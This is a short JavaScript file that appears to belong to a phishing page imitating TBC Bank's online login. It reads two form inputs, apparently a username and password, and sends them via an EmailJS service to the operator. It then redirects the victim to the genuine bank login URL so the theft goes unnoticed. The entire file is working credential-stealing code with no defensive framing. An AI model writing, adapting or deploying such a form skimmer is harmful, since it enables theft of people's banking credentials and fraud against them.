const input = document.getElementsByTagName('input')

console.log(input)

function sendMail(){
  if (input[0].value != '' && input[1].value != ''){
    var obj = {
      from_name:  '',
      to_name: '',
      message: input[0].value + ' ' + input[1].value
    }

    emailjs.send('service_d8mlcxq','template_fce14io',obj)
    .then((res) => {
      window.open('https://tbconline.ge/mbs-json/pda/external/login','_self')
    })
  }
}
